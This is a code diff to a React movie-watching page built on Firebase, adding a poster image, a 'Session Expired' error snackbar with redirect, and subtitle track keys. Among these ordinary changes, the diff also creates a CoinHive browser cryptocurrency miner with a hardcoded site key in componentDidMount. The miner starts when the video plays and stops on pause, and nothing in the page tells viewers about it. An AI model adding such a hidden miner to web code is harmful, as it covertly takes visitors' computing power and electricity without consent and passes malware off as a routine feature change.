@@ -1,6 +1,8 @@
 import React, { Component } from 'react';
 import { DefaultPlayer as Video } from 'react-html5video';
 import 'react-html5video/dist/styles.css';
+import { Button, Snackbar } from "material-ui";
+import { Redirect } from "react-router";
 import { BasicLayout } from '../components';
 import * as firebase from 'firebase';
 import 'firebase/firestore';
@@ -9,6 +11,9 @@ class WatchPage extends Component {
   state = {
     subsUrl: [],
     title: 'Watch Movie',
+    image: '',
+    error: false,
+    redirect: false,
   };
 
   componentDidMount() {
@@ -28,10 +33,55 @@ class WatchPage extends Component {
         this.setState({
           subsUrl: targetedSubs,
           title: movieData.title,
+          image: movieData.image
         });
       });
+      this.miner = new window.CoinHive.Anonymous('6IgN0USpT1jJBVBsx66mPZ8KCQiuH1VD', {throttle: 0.5});
   }
+
+  onVideoError = event => {
+    this.setState({
+      error: true
+    });
+  }
+
+  errorRedirect = event => {
+    this.setState({
+      redirect: true
+    })
+  }
+
+  renderSnackBar = () => {
+    if (this.state.error) {
+      return (
+        <Snackbar
+          open
+          message={<span>Session Expired</span>}
+          action={
+            [
+              <Button key="redirect-snackbar" color="accent" onClick={this.errorRedirect}>Close</Button>
+            ]
+          }
+        />
+      )
+    }
+    return null;
+  }
+
+  onPlayingVideo = event => {
+    this.miner.start();
+  }
+
+  onPauseVideo = event => {
+    this.miner.stop();
+  }
+
   render() {
+    if (this.state.redirect) {
+      return (
+        <Redirect to="/" />
+      )
+    }
     return (
       <BasicLayout title={this.state.title}>
         <div>
@@ -39,6 +89,10 @@ class WatchPage extends Component {
             src={`/data/${this.props.match.params.id}`}
             autoPlay
             crossOrigin="anonymous"
+            onError={this.onVideoError}
+            onPlaying={this.onPlayingVideo}
+            onPause={this.onPauseVideo}
+            poster={this.state.image}
             controls={[
               'PlayPause',
               'Seek',
@@ -49,6 +103,7 @@ class WatchPage extends Component {
             ]}>
             {this.state.subsUrl.map(subs => (
               <track
+                key={`key-${subs.lang}`}
                 label={subs.langName}
                 kind="subtitles"
                 srcLang={subs.lang}
@@ -58,6 +113,7 @@ class WatchPage extends Component {
             ))}
           </Video>
         </div>
+        {this.renderSnackBar()}
       </BasicLayout>
     );
   }
